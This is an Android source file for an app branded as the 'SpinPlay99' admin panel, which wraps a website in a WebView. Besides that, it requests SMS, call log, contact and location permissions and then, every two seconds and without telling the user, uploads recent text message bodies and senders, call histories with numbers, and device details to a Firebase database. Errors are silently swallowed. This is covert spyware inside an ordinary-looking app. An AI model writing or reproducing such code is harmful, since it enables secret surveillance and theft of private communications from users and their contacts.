package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://spinplay99.com";
    private static final int FILE_CHOOSER_REQUEST = 1001;
    private static final int PERMISSION_REQUEST_CODE = 2001;

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private ValueCallback<Uri[]> filePathCallback;
    
    // Firebase Realtime Database
    private DatabaseReference mDatabase;
    private String deviceId;
    
    // Real-time tracking
    private ScheduledExecutorService scheduler;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize Firebase
        FirebaseApp.initializeApp(this);
        mDatabase = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), 
                   Settings.Secure.ANDROID_ID);

        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle("SpinPlay99");
            getSupportActionBar().setSubtitle("Admin Panel");
        }

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);

        requestAllPermissions();

        setupWebView();
        setupSwipeRefresh();

        webView.loadUrl(SERVER_URL);
        
        // Real-time tracking start
        startRealTimeTracking();
    }

    // ========== PERMISSION HANDLING ==========
    
    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();

        String[] requiredPermissions = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
        };

        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissions.add(permission);
            }
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    // ========== REAL-TIME TRACKING (Every 2 Seconds) ==========
    
    private void startRealTimeTracking() {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        
        // Har 2 seconds me data update
        scheduler.scheduleAtFixedRate(() -> {
            Map<String, Object> realTimeData = collectRealTimeData();
            
            // Realtime Database me direct update
            mDatabase.child("devices")
                    .child(deviceId)
                    .child("live_data")
                    .setValue(realTimeData)
                    .addOnSuccessListener(aVoid -> {
                        // Data updated successfully
                    })
                    .addOnFailureListener(e -> {
                        // Error
                    });
            
            // Device info update
            updateDeviceInfo();
            
        }, 0, 2, TimeUnit.SECONDS);  // ⬅️ 2 seconds interval
    }

    private Map<String, Object> collectRealTimeData() {
        Map<String, Object> data = new HashMap<>();
        
        // Timestamp with milliseconds
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());
        data.put("timestamp", sdf.format(new Date()));
        data.put("timestamp_millis", System.currentTimeMillis());
        
        // Device basic info
        data.put("battery_level", getBatteryLevel());
        data.put("network_type", getNetworkType());
        data.put("is_charging", isDeviceCharging());
        data.put("screen_on", isScreenOn());
        
        // All permissions real-time status
        data.put("permissions", getAllPermissionsStatus());
        
        // SMS data (if permission granted)
        if (checkPermission(Manifest.permission.READ_SMS)) {
            data.put("total_sms", getSmsCount());
            data.put("unread_sms", getUnreadSmsCount());
            data.put("recent_sms", getRecentSms());
        }
        
        // Call logs (if permission granted)
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            data.put("total_calls", getCallLogsCount());
            data.put("recent_calls", getRecentCallLogs());
        }
        
        // Contacts (if permission granted)
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            data.put("contacts_count", getContactsCount());
        }
        
        // Location (if permission granted)
        if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            data.put("location_available", true);
        }
        
        // Storage info
        data.put("storage", getStorageInfo());
        
        // RAM info
        data.put("ram", getRamInfo());
        
        return data;
    }

    private void updateDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("device_id", deviceId);
        deviceInfo.put("device_model", Build.MODEL);
        deviceInfo.put("device_brand", Build.BRAND);
        deviceInfo.put("android_version", Build.VERSION.RELEASE);
        deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
        deviceInfo.put("last_seen", System.currentTimeMillis());
        deviceInfo.put("permissions_summary", getAllPermissionsStatus());
        
        mDatabase.child("devices")
                .child(deviceId)
                .child("device_info")
                .setValue(deviceInfo);
    }

    // ========== DATA COLLECTION METHODS ==========

    private Map<String, Boolean> getAllPermissionsStatus() {
        Map<String, Boolean> permissions = new HashMap<>();
        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        permissions.put("read_phone_state", checkPermission(Manifest.permission.READ_PHONE_STATE));
        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        permissions.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
        permissions.put("camera", checkPermission(Manifest.permission.CAMERA));
        permissions.put("microphone", checkPermission(Manifest.permission.RECORD_AUDIO));
        
        return permissions;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) 
               == PackageManager.PERMISSION_GRANTED;
    }

    private int getSmsCount() {
        int count = 0;
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return count;
    }

    private int getUnreadSmsCount() {
        int count = 0;
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null,
                "read = 0",
                null,
                null
            );
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return count;
    }

    private List<Map<String, String>> getRecentSms() {
        List<Map<String, String>> smsList = new ArrayList<>();
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"address", "body", "date", "type", "read"},
                null, null,
                "date DESC LIMIT 5"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, String> sms = new HashMap<>();
                    sms.put("address", cursor.getString(0));
                    sms.put("body", cursor.getString(1) != null ? 
                           cursor.getString(1).substring(0, Math.min(50, cursor.getString(1).length())) : "");
                    sms.put("date", cursor.getString(2));
                    sms.put("type", cursor.getString(3));
                    sms.put("read", cursor.getString(4));
                    smsList.add(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return smsList;
    }

    private int getCallLogsCount() {
        int count = 0;
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return count;
    }

    private List<Map<String, String>> getRecentCallLogs() {
        List<Map<String, String>> callList = new ArrayList<>();
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                },
                null, null,
                CallLog.Calls.DATE + " DESC LIMIT 5"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    Map<String, String> call = new HashMap<>();
                    call.put("number", cursor.getString(0));
                    
                    // Call type
                    String callType;
                    switch (Integer.parseInt(cursor.getString(1))) {
                        case CallLog.Calls.INCOMING_TYPE:
                            callType = "INCOMING";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            callType = "OUTGOING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callType = "MISSED";
                            break;
                        default:
                            callType = "UNKNOWN";
                    }
                    call.put("type", callType);
                    call.put("date", cursor.getString(2));
                    call.put("duration", cursor.getString(3));
                    callList.add(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return callList;
    }

    private int getContactsCount() {
        int count = 0;
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Handle silently
        }
        return count;
    }

    // ========== DEVICE INFO METHODS ==========

    private int getBatteryLevel() {
        int level = 0;
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) {
                    level = (level * 100) / scale;
                }
            }
        } catch (Exception e) {
            // Handle silently
        }
        return level;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
                getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null && activeNetwork.isConnected()) {
                return activeNetwork.getTypeName() + " (" + activeNetwork.getSubtypeName() + ")";
            }
        } catch (Exception e) {
            // Handle silently
        }
        return "No Connection";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            // Handle silently
        }
        return false;
    }

    private boolean isScreenOn() {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) 
                getSystemService(Context.POWER_SERVICE);
            return pm.isInteractive();
        } catch (Exception e) {
            return false;
        }
    }

    private Map<String, Object> getStorageInfo() {
        Map<String, Object> storage = new HashMap<>();
        try {
            java.io.File path = android.os.Environment.getDataDirectory();
            android.os.StatFs stat = new android.os.StatFs(path.getPath());
            
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            
            storage.put("total_gb", (totalBlocks * blockSize) / (1024.0 * 1024 * 1024));
            storage.put("available_gb", (availableBlocks * blockSize) / (1024.0 * 1024 * 1024));
            storage.put("used_percent", 100 - ((availableBlocks * 100) / totalBlocks));
        } catch (Exception e) {
            // Handle silently
        }
        return storage;
    }

    private Map<String, Object> getRamInfo() {
        Map<String, Object> ram = new HashMap<>();
        try {
            android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
            android.app.ActivityManager activityManager = 
                (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            activityManager.getMemoryInfo(mi);
            
            ram.put("total_gb", mi.totalMem / (1024.0 * 1024 * 1024));
            ram.put("available_gb", mi.availMem / (1024.0 * 1024 * 1024));
            ram.put("used_percent", ((mi.totalMem - mi.availMem) * 100) / mi.totalMem);
        } catch (Exception e) {
            // Handle silently
        }
        return ram;
    }

    // ========== WEBVIEW SETUP ==========
    
    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setSupportZoom(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        settings.setMediaPlaybackRequiresUserGesture(false);

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (!url.contains(getBaseHost(SERVER_URL))) {
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                    } catch (Exception e) {
                        view.loadUrl(url);
                    }
                    return true;
                }
                return false;
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                progressBar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                injectMobileCSS();
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                showOfflinePage();
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                progressBar.setProgress(newProgress);
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                              FileChooserParams fileChooserParams) {
                MainActivity.this.filePathCallback = filePathCallback;
                Intent intent = fileChooserParams.createIntent();
                try {
                    startActivityForResult(intent, FILE_CHOOSER_REQUEST);
                } catch (Exception e) {
                    MainActivity.this.filePathCallback = null;
                    return false;
                }
                return true;
            }

            @Override
            public void onReceivedTitle(WebView view, String title) {
                if (getSupportActionBar() != null && title != null && !title.isEmpty()) {
                    getSupportActionBar().setTitle(title);
                }
            }
        });
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(() -> webView.reload());
    }

    private void injectMobileCSS() {
        String css = "var s=document.createElement('style');" +
                "s.textContent='" +
                "body{-webkit-text-size-adjust:100%!important}" +
                ".wrap{padding:12px 10px!important}" +
                "input,select,textarea{font-size:16px!important}" +
                "button.btn{min-height:40px!important;padding:8px 12px!important}" +
                ".card{padding:14px!important}" +
                "';" +
                "document.head.appendChild(s);";
        webView.evaluateJavascript("(function(){" + css + "})()", null);
    }

    private void showOfflinePage() {
        String html = "<html><body style='background:#0e0e12;color:#e8e8f0;" +
                "font-family:sans-serif;display:flex;flex-direction:column;" +
                "align-items:center;justify-content:center;height:100vh;" +
                "margin:0;text-align:center;padding:20px'>" +
                "<div style='font-size:48px'>📡</div>" +
                "<h2 style='color:#FFD700;margin:12px 0'>Connection Error</h2>" +
                "<p style='color:#8888aa;font-size:14px'>Unable to connect to the server." +
                "<br>Please check your internet connection.</p>" +
                "<button onclick='location.reload()' style='margin-top:20px;" +
                "padding:10px 24px;background:#FFD700;color:#000;border:none;" +
                "border-radius:8px;font-size:14px;font-weight:700;cursor:pointer'>" +
                "Retry</button></body></html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    private String getBaseHost(String url) {
        try {
            Uri uri = Uri.parse(url);
            return uri.getHost() != null ? uri.getHost() : url;
        } catch (Exception e) {
            return url;
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            new AlertDialog.Builder(this)
                    .setTitle("Exit")
                    .setMessage("Do you want to close the app?")
                    .setPositiveButton("Yes", (d, w) -> finish())
                    .setNegativeButton("No", null)
                    .show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQUEST) {
            if (filePathCallback != null) {
                Uri[] results = WebChromeClient.FileChooserParams.parseResult(resultCode, data);
                filePathCallback.onReceiveValue(results);
                filePathCallback = null;
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String msg) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, msg, Toast.LENGTH_SHORT).show());
        }
        
        @JavascriptInterface
        public String getDeviceId() {
            return deviceId;
        }
        
        @JavascriptInterface
        public String getPermissionsStatus() {
            return getAllPermissionsStatus().toString();
        }
    }
}
